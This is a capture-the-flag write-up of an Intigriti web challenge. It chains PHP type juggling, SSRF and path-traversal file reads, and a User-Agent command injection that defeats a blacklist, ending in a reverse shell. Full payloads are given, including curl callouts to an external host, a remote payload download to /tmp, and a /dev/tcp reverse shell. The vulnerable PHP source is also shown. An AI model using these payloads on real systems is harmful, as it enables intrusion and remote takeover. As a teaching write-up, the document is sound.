# Intigriti's April challenge by strangeMMonkey1

## 1. Introduction

The purpose of the task as stated in **Intrigiti** page was to retrieve the flag from the webserver.

![](https://i.imgur.com/gnRpahD.jpg)

My typical approach involved manually exploring the web application and crawling as many URLs as possible. After completing this process, I began searching for any anomalies, interesting parameters, and comments left by developers.

Using **Burp Suite**, I successfully extracted all comments from the crawled pages.

There was one on **index_error.php** page that got my attention.
![](https://i.imgur.com/yVwlmtV.jpg)

**Comment:** ```"dev TODO : remember to use strict comparision"```

It indicated that **strict comparision** isn't implemented yet somewhere. It means that it could be some sort of "**Type Juggling**" vulnerability. 

## What is Type Juggling?
PHP type juggling vulnerabilities arise when loose comparison (== or !=) is employed instead of strict comparison (=== or !==) in an area where the attacker can control one of the variables being compared. This vulnerability can result in the application returning an unintended answer to the true or false statement, and can lead to severe authorization and/or authentication bugs.

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md

Knowing that information, I began searching for locations where such comparisons could occur. 

Using **Burp Suite**, I extracted all identified parameters and cookies.

![](https://i.imgur.com/L7SVhcJ.png)

![](https://i.imgur.com/Yz68Drd.png)

**List with parameters:**
```
errro
psw
uname
```
**Cookies:**
```
account_type
username
```

To further test the discovered parameters and cookies, I typically attempt to pass unexpected data type such as **Array** when **String** is expected. If the code lacks proper handling and has errors enabled, this can reveal valuable information about the functions used on the backend.

To test it. I used **Array** - **[]=** for **uname** and **psw**.

![](https://i.imgur.com/NSCv5VP.png)

As a result, It was obvious that errors were enabled.

I applied the same approach to other parameters and cookies, and noticed that the "**account_type**" cookie utilized the **MD5** function on the input value.

![](https://i.imgur.com/fOakywK.png)

With the knowledge that **MD5** hash function was being used on the value, I examined the "**Type Juggling**" repository for possible exploitation through comparison with **MD5** hashes. An interesting section named "**Magic Hashes**" was presented. 

## What are "Magic Hashes"
if the hash computed starts with "0e" (or "0..0e") only followed by numbers, PHP will treat the hash as a float.

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md

**Example**
```
<?php
var_dump(md5('240610708') == md5('QNKCDZO')); # bool(true)
//md5('240610708') = 0e462097431906509019562988736854 
//md5('QNKCDZO') =  0e830400451993494058024219903391 
?>
```

As we are aware, the cookie value of **account_type** is hashed using **MD5** on the backend. To further exploit this, I assummed that there would be a comparison on the backend between the value we provide and another hash that begins with "0e...". This would result in the hash being treated as a float, potentially leading to unintended behavior.

## Testing for Type Juggling
| Hash | "Magic" Number / String    | Magic Hash                                    | Found By / Description      |
| ---- | -------------------------- |:---------------------------------------------:| -------------:|
| MD5  | 240610708                  | 0e462097431906509019562988736854              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | QNKCDZO                    | 0e830400451993494058024219903391              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | 0e1137126905               | 0e291659922323405260514745084877              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |
| MD5  | 0e215962017                | 0e291242476940776845150308577824              | [@spazef0rze](https://twitter.com/spazef0rze/status/439352552443084800) |

From the table above, it becomes apparent that there are several possible ways to generate a hash that starts with **0e..**. For the test, I picked the value "**QNKCDZO**" and repeated the request to "**/dashboard.php**" endpoint. 

![](https://i.imgur.com/j3Y8zqy.png)

The response I received was **297,742** bytes long, which clearly indicated the presence of additional content within the page. While examining the response, I came across some interesting text within the "**id**" attribute, which stated:

```
custom_image.php - try to catch the flag.txt ;)
```

Upon visiting "**custom_image.php**", a golden wall was displayed.

![](https://i.imgur.com/ZoHtQRv.png)

## Reading Local Files / SSRF
By testing commonly known parameters against "**custom_image.php**", I discovered the existence of a "**file**" GET parameter. I concluded that by receiving a different response "**Permission denied!**"

![](https://i.imgur.com/O7fA0JT.png)

Unfortunately, it looked like there was a whitelist used against the value of file parameter. First thing that came to my mind was to test already known "Paths" discovered during the initial inspection of the application.
- **/app/**
- **/www/web/images**

After spending some time testing, I noticed that **/www/web/images** is required value to be presented in **file** GET param. 

```
https://challenge-0423.intigriti.io/custom_image.php?file=/www/web/images/
```
![](https://i.imgur.com/RLKI5SK.jpg)

From the response received, I could conclude that there was potential "**Server Side Request Forgery**" vulnerability due to the usage of **file_get_contents()** function.
Furthermore, I noticed that the path "/www/web/images" is required to be within the value but not limited to start with it. Probably "**strpos**" function was checking it. 

For a **PoC**, I crafted the following payload:
```
https://challenge-0423.intigriti.io/custom_image.php?file=https://q4v26aafvedi31gosp501o6qthz8nzbo.oastify.com/?a=/www/web/images
```
The request was send to my Burp Collaborator, which meant that /www/web/images/ was checking iwth strpos or similar function. 

In this case, requesting external resource wasn't enough to further exploit the application. What I decided to use instead is "file://" schema with file_get_contents, which allowed me to read local files on the webserver. I already got the full path of the document_root - "**/app/**" which was neccessary to read files within that directory. 

![](https://i.imgur.com/c7rpkLo.png)

For some reason `../` was removed from the value which indicated that a **blacklist** is used on the backend. Another way to bypass it was by using `..\`. 

Using `..\` I managed to retrieve the content of file **flag.txt** from **/app** directory. File **flag.txt** was mentioned in one of the comments, because of that I tried to load it. 
```
https://challenge-0423.intigriti.io/custom_image.php?file=/www/web/images/..\..\..\app/flag.txt
```

The returned response was:

```html
<img src="data: image/jpeg;base64,SGV5IE1hcmlvLCB0aGUgZmxhZyBpcyBpbiBhbm90aGVyIHBhdGghIFRyeSB0byBjaGVjayBoZXJlOgoKL2U3ZjcxN2VkLWQ0MjktNGQwMC04NjFkLTQxMzdkMWVmMjlhei85NzA5ZTk5My1iZTQzLTQxNTctODc5Yi03OGI2NDdmMTVmZjcvYWRtaW4ucGhwCg==">
```
The content of the file was within `<img` tag and **Base64** encoded. 

**Base64** decoded value:
```
Hey Mario, the flag is in another path! Try to check here:

/e7f717ed-d429-4d00-861d-4137d1ef29az/9709e993-be43-4157-879b-78b647f15ff7/admin.php
```

As requested, I checked the **admin.php** as well.
```
view-source:https://challenge-0423.intigriti.io/custom_image.php?file=/www/web/images/..\..\..\app\e7f717ed-d429-4d00-861d-4137d1ef29az/9709e993-be43-4157-879b-78b647f15ff7/admin.php
```
```
PD9waHAKaWYoaXNzZXQoJF9DT09LSUVbInVzZXJuYW1lIl0pKSB7CiAgJGEgPSAkX0NPT0tJRVsidXNlcm5hbWUiXTsKICBpZigkYSAhPT0gJ2FkbWluJyl7CiAgICBoZWFkZXIoJ0xvY2F0aW9uOiAvaW5kZXhfZXJyb3IucGhwP2Vycm9yPWludmFsaWQgdXNlcm5hbWUgb3IgcGFzc3dvcmQnKTsgICAgCiAgfQp9CmlmKCFpc3NldCgkX0NPT0tJRVsidXNlcm5hbWUiXSkpewogIGhlYWRlcignTG9jYXRpb246IC9pbmRleF9lcnJvci5waHA/ZXJyb3I9aW52YWxpZCB1c2VybmFtZSBvciBwYXNzd29yZCcpOwp9Cj8+Cjw/cGhwCiR1c2VyX2FnZW50ID0gJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOwoKI2ZpbHRlcmluZyB1c2VyIGFnZW50CiRibGFja2xpc3QgPSBhcnJheSggInRhaWwiLCAibmMiLCAicHdkIiwgImxlc3MiLCAibmNhdCIsICJscyIsICJuZXRjYXQiLCAiY2F0IiwgImN1cmwiLCAid2hvYW1pIiwgImVjaG8iLCAifiIsICIrIiwKICIgIiwgIiwiLCAiOyIsICImIiwgInwiLCAiJyIsICIlIiwgIkAiLCAiPCIsICI+IiwgIlxcIiwgIl4iLCAiXCIiLAoiPSIpOwokdXNlcl9hZ2VudCA9IHN0cl9yZXBsYWNlKCRibGFja2xpc3QsICIiLCAkdXNlcl9hZ2VudCk7CgpzaGVsbF9leGVjKCJlY2hvIFwiIiAuICR1c2VyX2FnZW50IC4gIlwiID4+IGxvZ1VzZXJBZ2VudCIpOwo/Pgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZW4iPgoKPGhlYWQ+CiAgPG1ldGEgY2hhcnNldD0iVVRGLTgiPgogIDxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iSUU9ZWRnZSI+CiAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPgogIDx0aXRsZT5BZG1pbiBwYW5lbDwvdGl0bGU+CiAgPHN0eWxlPgogICAgYm9keSB7CiAgICAgIGZvbnQtZmFtaWx5OiBBcmlhbCwgSGVsdmV0aWNhLCBzYW5zLXNlcmlmOwogICAgICBiYWNrZ3JvdW5kLWltYWdlOiB1cmwoJy93d3cvd2ViL2ltYWdlcy9hbm90aGVyX2JyaWNrX2luX3RoZV93YWxsLmpwZWcnKTsKICAgICAgYmFja2dyb3VuZC1wb3NpdGlvbjogdG9wIDE4JSByaWdodCA1MCU7CiAgICAgIGJhY2tncm91bmQtcmVwZWF0OiByZXBlYXQ7CiAgICB9CiAgICAuZGVsIHsKICAgICAgY29sb3I6IGJsdWU7CiAgICB9CiAgICBuYXY+YSB7CiAgICAgIHBhZGRpbmc6MC4ycmVtOwogICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgIGJvcmRlcjogNHB4IHNvbGlkIGdyZXk7CiAgICAgIGJvcmRlci1yYWRpdXM6IDhweDsKICAgICAgYmFja2dyb3VuZC1jb2xvcjogZ3JleTsKICAgIH0KICAgIG5hdj5hOnZpc2l0ZWQgewogICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgIGNvbG9yOmJsdWU7CiAgICB9CiAgICB0YWJsZSB7CiAgICAgIGJvcmRlcjogMnB4IHNvbGlkIGJsYWNrOwogICAgICBib3JkZXItcmFkaXVzOiA0cHg7CiAgICB9CiAgPC9zdHlsZT4KPC9oZWFkPgoKPGJvZHk+CiAgPGRpdj4KICAgIDxuYXY+CiAgICAgIDxhIGhyZWY9Ii9kYXNoYm9hcmQucGhwIj5EYXNoYm9hcmQ8L2E+CiAgICAgIDxhIGhyZWY9Ii9lN2Y3MTdlZC1kNDI5LTRkMDAtODYxZC00MTM3ZDFlZjI5YXovOTcwOWU5OTMtYmU0My00MTU3LTg3OWItNzhiNjQ3ZjE1ZmY3L2xvZ19wYWdlLnBocCI+TG9nczwvYT4KICAgIDwvbmF2PgogIDwvZGl2PgogIDxkaXYgc3R5bGU9InBhZGRpbmctdG9wOjFyZW07cG9zaXRpb246IGFic29sdXRlO2xlZnQ6IDIlOyI+CiAgICA8dGFibGUgYXJpYS1sYWJlbD0iVGFibGUgb2YgdGhlIFVzZXJzIj4KICAgICAgPHRib2R5PgogICAgICAgIDx0cj4KICAgICAgICAgIDx0aCBzY29wZT0iY29sZ3JvdXAiPlVzZXJzPC90aD4KICAgICAgICA8L3RyPgogICAgICAgIDx0cj4KICAgICAgICAgIDx0ZD5DYXJsb3M8L3RkPgogICAgICAgICAgPHRkIGNsYXNzPSJkZWwiPmRlbGV0ZTwvdGQ+CiAgICAgICAgPC90cj4KICAgICAgICA8dHI+CiAgICAgICAgICA8dGQ+V2llbmVyPC90ZD4KICAgICAgICAgIDx0ZCBjbGFzcz0iZGVsIj5kZWxldGU8L3RkPgogICAgICAgIDwvdHI+CiAgICAgIDwvdGJvZHk+CiAgICA8L3RhYmxlPgogIDwvZGl2PgogIDxkaXYgc3R5bGU9InBvc2l0aW9uOiBhYnNvbHV0ZTtyaWdodDogMiU7Ij4KICAgIDx0YWJsZSBhcmlhLWxhYmVsPSJUYWJsZSBvZiB0aGUgQWdlbnRzIj4KICAgICAgPHRib2R5PgogICAgICAgIDx0ciBzdHlsZT0idGV4dC1hbGlnbjogY2VudGVyOyI+CiAgICAgICAgICA8dGggc2NvcGU9ImNvbGdyb3VwIj5BZ2VudHM8L3RoPgogICAgICAgIDwvdHI+CiAgICAgICAgPHRyPgogICAgICAgICAgPHRkPlBpcHBvPC90ZD4KICAgICAgICAgIDx0ZCBjbGFzcz0iZGVsIj5kZWxldGU8L3RkPgogICAgICAgIDwvdHI+CiAgICAgICAgPHRyPgogICAgICAgICAgPHRkPlBsdXRvPC90ZD4KICAgICAgICAgIDx0ZCBjbGFzcz0iZGVsIj5kZWxldGU8L3RkPgogICAgICAgIDwvdHI+CiAgICAgIDwvdGJvZHk+CiAgICA8L3RhYmxlPgogIDwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4=
```

**Base64** decoded:
```php
<?php
if(isset($_COOKIE["username"])) {
  $a = $_COOKIE["username"];
  if($a !== 'admin'){
    header('Location: /index_error.php?error=invalid username or password');    
  }
}
if(!isset($_COOKIE["username"])){
  header('Location: /index_error.php?error=invalid username or password');
}
?>
<?php
$user_agent = $_SERVER['HTTP_USER_AGENT'];

#filtering user agent
$blacklist = array( "tail", "nc", "pwd", "less", "ncat", "ls", "netcat", "cat", "curl", "whoami", "echo", "~", "+",
 " ", ",", ";", "&", "|", "'", "%", "@", "<", ">", "\\", "^", "\"",
"=");
$user_agent = str_replace($blacklist, "", $user_agent);

shell_exec("echo \"" . $user_agent . "\" >> logUserAgent");
?>
... HTML PART
```

Upon close inspection, the **shell_exec** function and the blacklist caught my attention. However, for some reason, no data was being logged to **logUserAgent** file when I requested **/admin.php**. Due to this reason and to facilitate debugging and gain greater insight, I opted to run the code on my server.


## Beating the Blacklist
To make it easier for debugging, I made some modifications to the script. 

```php
<?php

#filtering user agent
$blacklist = array( "tail", "nc", "pwd", "less", "ncat", "ls", "netcat", "cat", "curl", "whoami", "echo", "~", "+",
 " ", ",", ";", "&", "|", "'", "%", "@", "<", ">", "\\", "^", "\"",
"=");
$user_agent = str_replace($blacklist, "", $_GET['id']);

//Replaced shell_exec with echo for testing purposes
echo("echo \"" . $user_agent . "\" >> logUserAgent");
?>
```

A potential method for bypassing the blacklist involves using a substitution like '**cucurlrl**'. When '**curl**' within '**cu*rl**' is replaced with an empty string by **str_replace**, it results in '**curl**' which is complete bypass of the blacklist.

To further bypass the whitespace restriction, we can utilize the Internal Field Separator (**IFS**). By default, the **IFS** variable is set to whitespace characters, which allows us to evade space limitations in this context.

**Proof Of Concept**

![](https://i.imgur.com/M13WazC.jpg)

## Testing on Intigriti
To confirm that the bypass was working on the challenge, I crafted a request with the payload injected within the **User-Agent**. Also, additional cookie "**username=admin**" was required as can be seen in the **admin.php** code. 

**Payload:**
```
User-Agent: $(cucurlrl${IFS}2twevmzrkq2usd50h1ucq0v2itokca0z.oastify.com)
```
![](https://i.imgur.com/48DuGiv.png)

Request received on my collaborator:
![](https://i.imgur.com/9j7JvXs.png)

Knowing that I was able to run commands and bypass the blacklist, my last step was to get a reverse shell.

## Reverse Shell

Getting reverse shell was possible by downloading a remote file containing `bash -i >& /dev/tcp/10.0.0.1/4242 0>&1` on the /tmp directory.

**1. Downloading Reverse Shell**
**Payload:** `$(cucurlrl${IFS}http://<my-server>/cha/4${IFS}-o${IFS}/tmp/5)`
```
GET /e7f717ed-d429-4d00-861d-4137d1ef29az/9709e993-be43-4157-879b-78b647f15ff7/admin.php HTTP/2
Host: challenge-0423.intigriti.io
Cookie: account_type=QNKCDZO; username=admin;
User-Agent: $(cucurlrl${IFS}http://<my-server>/cha/4${IFS}-o${IFS}/tmp/5)
```

**2.Executing /tmp/5**
```
GET /e7f717ed-d429-4d00-861d-4137d1ef29az/9709e993-be43-4157-879b-78b647f15ff7/admin.php HTTP/2
Host: challenge-0423.intigriti.io
Cookie: account_type=QNKCDZO; username=admin;
User-Agent: $(bash${IFS}/tmp/5)
```

**3. Listener:**

![](https://i.imgur.com/EkUcWNv.jpg)

**Flag:**
```
https://challenge-0423.intigriti.io/e7f717ed-d429-4d00-861d-4137d1ef29az/9709e993-be43-4157-879b-78b647f15ff7/d5418803-972b-45a9-8ac0-07842dc2b607.txt
```
## Soure Code / Vulnerabilities
**RCE - admin.php**
```php
<?php
if(isset($_COOKIE["username"])) {
  $a = $_COOKIE["username"];
  if($a !== 'admin'){
    header('Location: /index_error.php?error=invalid username or password');
  }
}
if(!isset($_COOKIE["username"])){
  header('Location: /index_error.php?error=invalid username or password');
}
?>
<?php
$user_agent = $_SERVER['HTTP_USER_AGENT'];

#filtering user agent
$blacklist = array( "tail", "nc", "pwd", "less", "ncat", "ls", "netcat", "cat", "curl", "whoami", "echo", "~", "+",
 " ", ",", ";", "&", "|", "'", "%", "@", "<", ">", "\\", "^", "\"",
"=");
$user_agent = str_replace($blacklist, "", $user_agent);

shell_exec("echo \"" . $user_agent . "\" >> logUserAgent");
?>
```
**Type Juggling - dashboard.php**
```php
 <?php
                    $query = $pdo->prepare("SELECT account_type FROM users WHERE username = 'admin'");
                    $query->execute(array());
                    $account_type = $query->fetch()['account_type'];
                    if (isset($_COOKIE["account_type"])) {
                        if (md5($_COOKIE['account_type']) == md5($account_type)) {
                            echo '<div>';
                            include 'custom_image.php';
                            echo '<h3 id="custom_image.php - try to catch the flag.txt ;)">A special golden wall just for Premium Users ;) </h3><img src="resources/happyrating.png">$ FREE4U<a class="button" href="">View details</a></div>';
                        }
                    }
                    ?>
```

**SSRF / File Read - custom_image.php**
```php
<?php
function getImage()
{
  $file = 'www/web/images/goldenwall4admin.jpg';

  if (isset($_GET['file'])) {
    $file = $_GET['file'];
  }

  while (true) {
    if (strpos($file, "../") === false) { //OLD php version
      //if(str_contains($file,"../") === false){ //new php version
      break;
    }
    $file = str_replace("../", "", $file);
  }

  if (strtolower(PHP_OS) == "windows") {
    $file = str_replace("/", "\\", $file);
  } else {
    $file = str_replace("\\", "/", $file);
  }

  $regex = 'www/web/images';
  $pos = strpos($file, $regex);
  if ($pos === false) {
    echo "Permission denied!";
  } else {
    $imageData = base64_encode(file_get_contents($file));
    $src = 'data: image/jpeg;base64,' . $imageData;

    echo '<img src="' . $src . '">';
  }
}
getImage();
?>
```

https://twitter.com/lyubo_tsirkov
